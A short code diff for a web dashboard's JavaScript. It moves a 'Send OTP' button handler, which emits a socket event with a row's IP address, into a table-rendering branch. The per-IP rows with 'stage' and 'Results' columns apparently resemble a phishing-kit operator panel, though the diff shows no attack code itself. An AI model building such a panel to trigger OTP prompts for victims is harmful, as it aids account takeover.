@@ -149,6 +149,10 @@
                 <td>${details.stage || ''}</td>
                 <td><button class="btn btn-primary">Results</button>  <button class="btn btn-warning send-otp-button">Send OTP</button> </td> <!-- Action column -->
             `;
+                         let sendOtpButton = row.querySelector('.send-otp-button');
+          sendOtpButton.addEventListener('click', function() {
+            socket.emit('sendOTP', {ip: ipAddress })
+          });
           } else {
             row.innerHTML = `
                 <td><span class="badge bg-${color}">${details.status}</span></td>
@@ -159,10 +163,7 @@
             `;
             }
                   let resultsButton = row.querySelector('.results-button');
-                  let sendOtpButton = row.querySelector('.send-otp-button');
-          sendOtpButton.addEventListener('click', function() {
-            socket.emit('sendOTP', {ip: ipAddress })
-          });
+               
         resultsButton.addEventListener('click', function() {
              let modalBody = document.querySelector('#resultsModal .modal-body');
           let ipModel = ipAddress
